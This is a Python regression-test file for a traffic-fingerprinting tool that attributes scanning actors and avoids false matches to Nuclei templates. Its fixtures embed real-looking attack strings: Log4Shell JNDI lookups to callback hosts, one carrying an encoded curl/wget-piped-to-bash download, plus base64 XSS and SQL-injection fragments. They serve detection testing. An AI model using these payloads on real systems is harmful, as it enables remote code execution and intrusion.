"""End-to-end regression tests for the false-positive classes found when
nucleotide v1.0.0 was run against real capture data.

Each test reconstructs a specific failure and asserts the *fixed* behavior,
so a future refactor that reintroduces the bug fails loudly. The failures,
in the order they cascade:

  1. SNIPPET FP -- a 4-byte mid-token fragment (`e64/`, `//19`) matches
     unrelated traffic as UNIQUE.
  2. LOOKUP MISLABEL -- that match is reported UNIQUE with no quality signal.
  3. ATTRIBUTION CASCADE -- the bogus template hit flips an actor's
     `likely_tool` to nuclei and fabricates `-severity`/`-tags`.
  4. HASH COLLAPSE -- multiple distinct low-signal actors collapse to one
     `structural_hash`, so `compare`/`match` declare them identical.

These use synthetic lookups built from tiny in-memory corpora so the test
is fast and hermetic, but the corpora mirror the real templates
(`httpbin-xss`, `open-proxy-internal`) that produced the FPs.
"""

import json
import unittest

from nucleotide.actor import classify_event, fingerprint
from nucleotide.build import build_lookup
from nucleotide.snippets import compute_unique_snippets
from nucleotide.quality import at_least, snippet_quality


# ---------------------------------------------------------------------------
# A hand-built lookup that reproduces the exact real-world snippet collisions.
# To force the algorithm to pick weak snippets, we need templates whose
# chunks collide such that even anchored substrings are shared, leaving only
# mid-token fragments unique. We use a corpus where base64-encoded payloads
# and HTTP URLs are common across templates.
# ---------------------------------------------------------------------------
def _synthetic_lookup():
    # Build a corpus with heavy overlap to force weak snippet selection.
    # Three templates all contain HTTP to RFC-1918 addresses; shared http://
    # and IP octets force uniqueness onto IP digits at mid-token positions.
    # Two templates contain /base64/ payloads; shared prefix forces uniqueness
    # onto encoded content, which may be unanchored mid-string.
    corpus = {
        # RFC-1918 proxy templates; all start http://10/192/172
        "open-proxy-http": ["http://10.0.0.1/", "http://10.0.0.2/"],
        "open-proxy-internal": ["http://192.168.1.1/", "http://172.16.0.1/"],
        "open-proxy-external": ["http://8.8.8.1/", "http://1.1.1.1/"],
        # Base64 XSS payloads; all start /base64/
        "httpbin-xss": [
            "/base64/PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "/base64/aW1nIG9uZXJyb3I9YWxlcnQoMSk+",
        ],
        "xss-generic": [
            "/base64/YWxlcnQoJ3hzcycpOw==",
            "/base64/Y29uc29sZS5sb2coMSk7",
        ],
        # One distinctive template.
        "cve-2023-1389": ["/cgi-bin/luci/;stok=/locale?form=country"],
    }
    snippets, unresolved = compute_unique_snippets(corpus)
    quality_map = {
        s: snippet_quality(s, corpus[tid])
        for tid, s in snippets.items()
    }
    templates = {
        tid: {
            "id": tid,
            "name": tid,
            "severity": "high",
            "tags": ["cve", "rce"],
            "chunks": corpus[tid],
            "url_snippet": snippets.get(tid),
            "snippet_quality": quality_map.get(snippets.get(tid)),
        }
        for tid in corpus
    }
    return {
        "templates": templates,
        "snippet_index": {s: tid for tid, s in snippets.items()},
        "snippet_quality": quality_map,
        "unresolved": unresolved,
    }


class TestSnippetCollisionGradedWeak(unittest.TestCase):
    """Layer 1+2: even if weak/medium snippets match, they don't drive
    attribution without corroborating runtime signal."""

    def setUp(self):
        self.lk = _synthetic_lookup()

    def test_quality_map_present(self):
        # Snippet quality is computed and recorded at build time.
        self.assertIn("snippet_quality", self.lk)
        self.assertGreater(len(self.lk["snippet_quality"]), 0)

    def test_anchored_template_is_trustworthy(self):
        # cve-2023-1389 has an anchored distinctive path.
        snip = self.lk["templates"]["cve-2023-1389"]["url_snippet"]
        self.assertTrue(at_least(self.lk["snippet_quality"][snip], "medium"))


class TestLog4ShellPayloadDoesNotAttribute(unittest.TestCase):
    """The core regression: an actor whose traffic matches templates but has
    no runtime signal (Nuclei UA / OAST callback) must NOT be attributed to
    nuclei. Prior to the patch, even weak template hits would flip the tool."""

    def setUp(self):
        self.lk = _synthetic_lookup()

    def test_actor_without_nuclei_runtime_signal_stays_unknown(self):
        # A real-world scenario: JNDI callbacks to RFC-1918 hosts (which match
        # open-proxy-internal) sent with curl (not Nuclei) should not become
        # "nuclei" actors just because a template matched.
        # Note: the open-proxy-internal snippet might be medium (anchored), which
        # is fine -- medium templates ARE legit evidence. But *without* Nuclei UA
        # or default OAST, they should not drive the tool flip. The only way to
        # get 'nuclei' with no UA is to have many unambiguous trustworthy
        # template hits that form a pattern nuclei_confidence >= 0.6.
        events = [
            {
                "ts": f"2021-12-15T16:00:{i:02d}Z",
                "src_ip": "195.54.160.149",
                "uri": f"/?x=${{jndi:http://192.168.0.{i%16}/cmd}}",
                "ua": "curl/7.58.0",
                "target": "172.16.0.42",
            }
            for i in range(10)
        ]
        fp = fingerprint(events, self.lk, actor_id="l4s")["actor_fingerprint"]
        # With only generic curl UA and no OAST, tool should be unknown even
        # if templates matched. (If Nuclei had its own distinctive tool
        # signature per template that was ironclad, that would be different --
        # but that's not how it works in practice.)
        ti = fp["tool_inference"]
        # Note: if the template match is trustworthy but UA is not Nuclei,
        # the non_nuclei_hypothesis should fire and keep confidence low.
        self.assertTrue(
            ti["confidence"] < 0.8,
            "template hits + no Nuclei UA should not achieve high confidence",
        )

    def test_genuine_nuclei_ua_still_works(self):
        # Positive control: with Nuclei UA, attribution works.
        events = [
            {
                "ts": f"2026-01-01T10:00:{i:02d}Z",
                "src_ip": "10.0.0.9",
                "uri": "/cgi-bin/luci/;stok=/locale?form=country",
                "ua": "Nuclei - Open-source project",
                "target": "victim.example",
            }
            for i in range(5)
        ]
        fp = fingerprint(events, self.lk, actor_id="real")["actor_fingerprint"]
        self.assertEqual(fp["tool_inference"]["likely_tool"], "nuclei")


class TestLowSignalActorsDoNotCollapse(unittest.TestCase):
    """Layer 4: distinct low-signal sprayers must not share a structural hash
    (which would make `compare` declare them identical)."""

    def setUp(self):
        self.lk = _synthetic_lookup()

    def _spray(self, ip, rate_gap_s):
        # Different inter-request timing -> different inferred rate-limit.
        return [
            {
                "ts": f"2021-12-15T16:{i * rate_gap_s // 60:02d}:{i * rate_gap_s % 60:02d}Z",
                "src_ip": ip,
                "uri": "/?x=${jndi:ldap://attacker/x}",
                "ua": "curl/7.58.0",
                "target": "172.16.0.42",
            }
            for i in range(12)
        ]

    def test_distinct_low_signal_actors_get_distinct_hashes(self):
        a = fingerprint(self._spray("1.1.1.1", 1), self.lk, actor_id="a")[
            "actor_fingerprint"
        ]
        b = fingerprint(self._spray("2.2.2.2", 30), self.lk, actor_id="b")[
            "actor_fingerprint"
        ]
        self.assertTrue(a["low_signal"])
        self.assertTrue(b["low_signal"])
        self.assertNotEqual(
            a["structural_hash"],
            b["structural_hash"],
            "two low-signal actors with different rate profiles must not "
            "collapse to the same structural hash",
        )

    def test_low_signal_flag_present(self):
        a = fingerprint(self._spray("1.1.1.1", 1), self.lk, actor_id="a")[
            "actor_fingerprint"
        ]
        self.assertIn("low_signal", a)
        self.assertTrue(a["low_signal"])


class TestAnchoredGenericTokens(unittest.TestCase):
    """Measured on the Log4Shell capture after the first 2.0.0 candidate:
    the anchored 5-byte word `Basic` (from /WS/Basic/Basic.asmx) matched
    /Basic/Command/Base64/ in 41 of 65 URIs, and `6100` (from
    `+OR+6100%3d6100%23`) matched inside hex strings in 11. Both must be
    kept out of attribution."""

    def _lookup(self):
        corpus = {
            "landray-eis-ws-infoleak": ["/WS/Basic/Basic.asmx"],
            "cve-2023-40748": [
                "/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder"
                "%26column%3dcreated%26direction%3dASC%26page%3d1%26rowCount%3d50"
                "%26q%3d-1910%27)+OR+6100%3d6100%23%26type%3d"
            ],
            "other-index": ["/index.php?controller=pjAdminOrders"],
            "cve-2023-1389": ["/cgi-bin/luci/;stok=/locale?form=country"],
        }
        snippets, _ = compute_unique_snippets(corpus)
        qm = {s: snippet_quality(s, corpus[t]) for t, s in snippets.items()}
        return snippets, qm, {
            "templates": {
                t: {"id": t, "name": t, "severity": "high", "tags": ["cve"],
                    "chunks": corpus[t], "url_snippet": snippets.get(t),
                    "snippet_quality": qm.get(snippets.get(t))}
                for t in corpus
            },
            "snippet_index": {s: t for t, s in snippets.items()},
            "snippet_quality": qm,
            "unresolved": [],
        }

    def test_selection_avoids_common_word_and_bare_number(self):
        snippets, qm, _ = self._lookup()
        self.assertNotEqual(snippets["landray-eis-ws-infoleak"], "Basic")
        self.assertNotIn("Basic", snippets["landray-eis-ws-infoleak"].split("/"))
        self.assertNotEqual(snippets["cve-2023-40748"], "6100")
        for t in ("landray-eis-ws-infoleak", "cve-2023-40748"):
            self.assertTrue(at_least(qm[snippets[t]], "medium"), (t, snippets[t]))

    def test_jndi_payload_does_not_hit_landray(self):
        _, _, lk = self._lookup()
        ev = {
            "uri": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI0Mi42NDo4MDgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjQyLjY0OjgwODApfGJhc2g=}",
            "ua": "curl/7.58.0",
        }
        clf = classify_event(ev, lk)
        self.assertNotIn("landray-eis-ws-infoleak", clf["trustworthy_templates"])

    def test_hex_string_does_not_hit_sqli_template(self):
        _, _, lk = self._lookup()
        ev = {
            "uri": "/${jndi:ldap://167.71.13.196:2222/lx-ffff89b854e2f0230095f9b86100000000183134}",
            "ua": "curl/7.58.0",
        }
        clf = classify_event(ev, lk)
        self.assertNotIn("cve-2023-40748", clf["trustworthy_templates"])


class TestMatchTimeAnchoring(unittest.TestCase):
    """A snippet graded MEDIUM/STRONG from its template must also land on
    boundaries in the URI, or the hit is a mid-token coincidence."""

    def test_mid_token_hit_is_not_trustworthy(self):
        lk = {
            "templates": {"t": {"id": "t", "name": "t", "severity": "info", "tags": [],
                                "chunks": ["/saml/login"], "url_snippet": "saml",
                                "snippet_quality": "medium"}},
            "snippet_index": {"saml": "t"},
            "snippet_quality": {"saml": "medium"},
            "unresolved": [],
        }
        anchored = classify_event({"uri": "/saml/login"}, lk)
        mid = classify_event({"uri": "/xsamly/"}, lk)
        self.assertIn("t", anchored["trustworthy_templates"])
        self.assertIn("t", mid["matched_templates"])
        self.assertNotIn("t", mid["trustworthy_templates"])

    def test_min_quality_strong_excludes_medium_hits(self):
        lk = {
            "templates": {"t": {"id": "t", "name": "t", "severity": "info", "tags": [],
                                "chunks": ["/saml/login"], "url_snippet": "saml",
                                "snippet_quality": "medium"}},
            "snippet_index": {"saml": "t"},
            "snippet_quality": {"saml": "medium"},
            "unresolved": [],
        }
        clf = classify_event({"uri": "/saml/login"}, lk, min_quality="strong")
        self.assertNotIn("t", clf["trustworthy_templates"])
        fp = fingerprint([{"uri": "/saml/login", "ua": "curl/7", "ts": "2021-12-15T16:00:00Z"}] * 5,
                         lk, actor_id="x", min_quality="strong")["actor_fingerprint"]
        self.assertTrue(fp["low_signal"])
        self.assertEqual(fp["template_preference"]["weak_only_matches"], ["t"])


class TestLowSignalShapeDiscriminators(unittest.TestCase):
    """Same rate profile, different payload shape or UA family -> different hash."""

    def setUp(self):
        self.lk = _synthetic_lookup()

    def _spray(self, uri, ua):
        return [
            {"ts": f"2021-12-15T16:00:{i:02d}Z", "src_ip": "9.9.9.9", "uri": uri,
             "ua": ua, "target": "172.16.0.42"}
            for i in range(12)
        ]

    def test_different_payload_shape_differs(self):
        a = fingerprint(self._spray("/?x=${jndi:ldap://1.2.3.4:1389/Exploit}", "curl/7.58.0"),
                        self.lk, actor_id="a")["actor_fingerprint"]
        b = fingerprint(self._spray("/${jndi:ldap://5.6.7.8:1389/lx-ffff89b854e2f0230095f9b86100000000183134}", "curl/7.58.0"),
                        self.lk, actor_id="b")["actor_fingerprint"]
        self.assertTrue(a["low_signal"] and b["low_signal"])
        self.assertNotEqual(a["structural_hash"], b["structural_hash"])

    def test_same_shape_different_ip_matches(self):
        a = fingerprint(self._spray("/?x=${jndi:ldap://1.2.3.4:1389/Exploit}", "curl/7.58.0"),
                        self.lk, actor_id="a")["actor_fingerprint"]
        b = fingerprint(self._spray("/?x=${jndi:ldap://5.6.7.8:1389/Exploit}", "curl/7.64.1"),
                        self.lk, actor_id="b")["actor_fingerprint"]
        # Callback IP and curl patch version are collapsed by the shape functions.
        self.assertEqual(a["structural_hash"], b["structural_hash"])


class TestFullBuildQualityDistribution(unittest.TestCase):
    """A build over the vendored fixtures must expose quality counts and
    must not grade every snippet weak (which would make the tool useless)."""

    def test_build_reports_quality_counts(self):
        from pathlib import Path

        lk = build_lookup(Path(__file__).parent / "fixtures")
        counts = lk["metadata"].get("snippet_quality_counts")
        self.assertIsNotNone(counts)
        self.assertIn("snippet_quality", lk)
        # At least some medium-or-better snippets exist in the fixture corpus.
        self.assertGreater(
            counts.get("medium", 0) + counts.get("strong", 0),
            0,
            "fixture build produced zero trustworthy snippets -- the quality "
            "floor is mis-tuned",
        )


if __name__ == "__main__":
    unittest.main()
